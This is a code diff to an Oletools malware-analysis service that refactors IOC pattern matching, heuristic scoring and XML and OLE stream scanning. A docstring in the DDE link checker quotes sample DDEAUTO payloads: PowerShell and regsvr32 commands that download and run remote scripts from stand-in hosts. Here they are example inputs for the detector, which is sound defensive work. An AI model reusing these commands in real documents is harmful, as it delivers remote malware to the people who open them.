@@ -11,6 +11,7 @@ import unicodedata
 import zipfile
 import zlib
 from operator import attrgetter
+from collections import defaultdict
 
 import magic
 import olefile
@@ -135,19 +136,17 @@ class Oletools(ServiceBase):
     def get_tool_version(self):
         return self._oletools_version
 
-    def check_for_patterns(self, data, dataname):
+    def check_for_patterns(self, data):
         """Use FrankenStrings module to find strings of interest.
 
         Args:
             data: Data to be searched.
-            dataname: Name of data to place in AL result header.
 
         Returns:
-            AL result object and whether entity should be extracted (boolean).
+            Dictionary of strings found by type and whether entity should be extracted (boolean).
         """
-        extract = 0
-        ioc_res = None
-        score = 0
+        extract = False
+        found_tags = defaultdict(set)
 
         # Plain IOCs
         if self.patterns:
@@ -157,60 +156,19 @@ class Oletools(ServiceBase):
                         "VBE7.DLL"]
             pat_whitelist = ['Management', 'Manager', "microsoft.com"]
 
-            st_value = self.patterns.ioc_match(data, bogon_ip=True)
-            if len(st_value) > 0:
-                ioc_res = ResultSection(f"IOCs in {dataname}:")
-                for ty, val in st_value.items():
-                    if val == "":
-                        asc_asc = unicodedata.normalize('NFKC', val).encode('ascii', 'ignore')
-                        if any(x in asc_asc for x in pat_strs) \
-                                or asc_asc.endswith(tuple(pat_ends)) \
-                                or asc_asc in pat_whitelist:
-                            continue
-                        else:
-                            # Determine if entity should be extracted
-                            extract += self.decide_extract(ty, asc_asc)
-                            score += 1
+            patterns_found = self.patterns.ioc_match(data, bogon_ip=True)
+            for tag_type, iocs in patterns_found.items():
+                for ioc in iocs:
+                    if isinstance(ioc, bytes):
+                        ioc = safe_str(ioc)
+                    if any(string in ioc for string in pat_strs) \
+                            or ioc.endswith(tuple(pat_ends)) \
+                            or ioc in pat_whitelist:
+                        continue
+                    extract = extract or self.decide_extract(tag_type, ioc)
+                    found_tags[tag_type].add(ioc)
 
-                            ioc_res.add_line(f"Found the following {ty.rsplit('.', 1)[-1].upper()} string:")
-                            ioc_res.add_line(asc_asc)
-                    else:
-                        ulis = list(set(val))
-                        val_list = []
-                        for v in ulis:
-                            if any(str(x) in str(v) for x in pat_strs) \
-                                    or str(v).endswith(tuple([str(x) for x in pat_ends])) \
-                                    or str(v) in [str(x) for x in pat_whitelist]:
-                                continue
-                            else:
-                                if isinstance(v, bytes):
-                                    v = safe_str(v)
-
-                                extract += self.decide_extract(ty, v)
-                                score += 1
-                                val_list.append(v)
-                                ioc_res.add_tag(ty, v)
-                        if val_list:
-                            ioc_res.add_line(f"Found the following {ty.rsplit('.', 1)[-1].upper()} string:")
-                            ioc_res.add_line('  |  '.join(val_list))
-
-            if ioc_res:
-                if score == 0:
-                    ioc_res = None
-                else:
-                    # Set the heuristic based on the score range
-                    if score <= 5:
-                        ioc_res.set_heuristic(35)
-                    elif score <= 10:
-                        ioc_res.set_heuristic(36)
-                    else:
-                        ioc_res.set_heuristic(37)
-            if extract == 0:
-                extract = False
-            else:
-                extract = True
-
-        return ioc_res, extract
+        return dict(found_tags), extract
 
     # noinspection PyBroadException
     def check_for_b64(self, data, dataname):
@@ -370,10 +328,10 @@ class Oletools(ServiceBase):
             self.check_for_indicators(path)
             self.check_for_dde_links(path)
             self.check_for_macros(path, file_contents, request.sha256)
-            self.check_xml_strings(path)
             self.rip_mhtml(file_contents)
             self.extract_streams(path, file_contents)
             self.create_macro_sections(request.sha256)
+            self.check_xml_strings(path)
         except Exception as e:
             self.log.error(f"We have encountered a critical error for sample {self.sha}: {str(e)}")
 
@@ -389,7 +347,8 @@ class Oletools(ServiceBase):
                 request.result.add_section(section)
 
         if self.excess_extracted:
-            self.log.error(f"Too many files extracted for sample {self.sha}. {len(self.excess_extracted)} files were not extracted")
+            self.log.error(f"Too many files extracted for sample {self.sha}."
+                           f" {len(self.excess_extracted)} files were not extracted")
         # score_check = 0
         # for section in self.ole_result.sections:
         #     score_check += self.calculate_nested_scores(section)
@@ -519,11 +478,14 @@ class Oletools(ServiceBase):
         """
         xml_target_res = ResultSection("Attached External Template Targets in XML")
         xml_ioc_res = ResultSection("IOCs content:")
+        xml_ioc_res.set_heuristic(7)
+        xml_ioc_res.heuristic.frequency = 0
         xml_b64_res = ResultSection("Base64 content:")
         xml_big_res = ResultSection("Files too larged to be fully scanned")
         xml_big_res.set_heuristic(3)
         xml_big_res.heuristic.frequency = 0
 
+        ioc_files = defaultdict(list)
         # noinspection PyBroadException
         try:
             template_re = re.compile(rb'/(?:attachedTemplate|subDocument)".{1,512}[Tt]arget="((?!file)[^"]+)".{1,512}'
@@ -541,23 +503,25 @@ class Oletools(ServiceBase):
                         xml_big_res.add_line(f'{f}')
                         xml_big_res.heuristic.increment_frequency()
                     zip_uris.extend(template_re.findall(data))
-                    
+
                     # Extract all files with external targets
                     external = external_re.search(data)
 
                     # Check for IOC and b64 data in XML
-                    f_iocres, extract_ioc = self.check_for_patterns(data, f)
-                    if f_iocres:
-                        if not f_iocres.heuristic:
-                            f_iocres.set_heuristic(7)
-                        xml_ioc_res.add_subsection(f_iocres)
+                    iocs, extract_ioc = self.check_for_patterns(data)
+                    if iocs:
+                        for tag_type, tags in iocs.items():
+                            for tag in tags:
+                                ioc_files[tag_type+tag].append(f)
+                                xml_ioc_res.add_tag(tag_type, tag)
+
                     f_b64res, extract_b64 = self.check_for_b64(data, f)
                     if f_b64res:
                         f_b64res.set_heuristic(8)
                         xml_b64_res.add_subsection(f_b64res)
-                    extract_xml = extract_ioc + extract_b64
 
-                    if (extract_xml > 0 or external) and not f.endswith("vbaProject.bin"):  # all vba extracted anyways
+                    # all vba extracted anyways
+                    if (extract_ioc or extract_b64 or external) and not f.endswith("vbaProject.bin"):
                         xml_sha256 = hashlib.sha256(data).hexdigest()
                         if xml_sha256 not in xml_extracted:
                             xml_file_path = os.path.join(self.working_directory, xml_sha256)
@@ -601,7 +565,13 @@ class Oletools(ServiceBase):
 
         if xml_big_res.body:
             self.ole_result.add_section(xml_big_res)
-        if len(xml_ioc_res.subsections) > 0:
+        if xml_ioc_res.tags:
+            for tag_type, tags in xml_ioc_res.tags.items():
+                for tag in tags:
+                    xml_ioc_res.add_line(f"Found the {tag_type.rsplit('.',1)[-1].upper()} string {tag} in:")
+                    xml_ioc_res.add_lines(ioc_files[tag_type+tag])
+                    xml_ioc_res.add_line('')
+                    xml_ioc_res.heuristic.increment_frequency()
             self.ole_result.add_section(xml_ioc_res)
         if len(xml_b64_res.subsections) > 0:
             self.ole_result.add_section(xml_b64_res)
@@ -918,12 +888,12 @@ class Oletools(ServiceBase):
         """ typical results look like this:
         DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell
         \\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -C $e=(new-object system.net.webclient).downloadstring
-        ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx" 
-        DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden 
-        $e=(New-Object System.Net.WebClient).DownloadString('http://203.0.113.111/payroll.ps1');powershell 
+        ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx"
+        DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden
+        $e=(New-Object System.Net.WebClient).DownloadString('http://203.0.113.111/payroll.ps1');powershell
         -Command $e"
-        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe" 
-        "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons" 
+        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe"
+        "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons"
         """
 
         # To date haven't seen a sample with multiple links yet but it should be possible..
@@ -1633,14 +1603,21 @@ class Oletools(ServiceBase):
 
                     # Finally look for other IOC patterns, will ignore SRP streams for now
                     if self.patterns and not re.match(r'__SRP_[0-9]*', stream):
-                        ole_ioc_res, extract = self.check_for_patterns(data, stream)
-                        if ole_ioc_res:
-                            if not ole_ioc_res.heuristic:
-                                ole_ioc_res.set_heuristic(9)
-                            extract_stream = True
+                        ole_ioc_res = ResultSection(f"IOCs in {stream}:")
+                        ole_ioc_res.set_heuristic(9)
+                        ole_ioc_res.heuristic.frequency = 0
+                        iocs, extract_stream = self.check_for_patterns(data)
+                        for tag_type, tags in iocs.items():
+                            ole_ioc_res.add_line(
+                                f"Found the following {tag_type.rsplit('.', 1)[-1].upper()} string(s):")
+                            ole_ioc_res.add_line('  |  '.join(tags))
+                            ole_ioc_res.heuristic.increment_frequency(len(tags))
+                            for tag in tags:
+                                ole_ioc_res.add_tag(tag_type, tag)
+                        if iocs:
                             sus_res = True
                             sus_sec.add_subsection(ole_ioc_res)
-                    ole_b64_res, extract = self.check_for_b64(data, stream)
+                    ole_b64_res, _ = self.check_for_b64(data, stream)
                     if ole_b64_res:
                         ole_b64_res.set_heuristic(10)
                         extract_stream = True
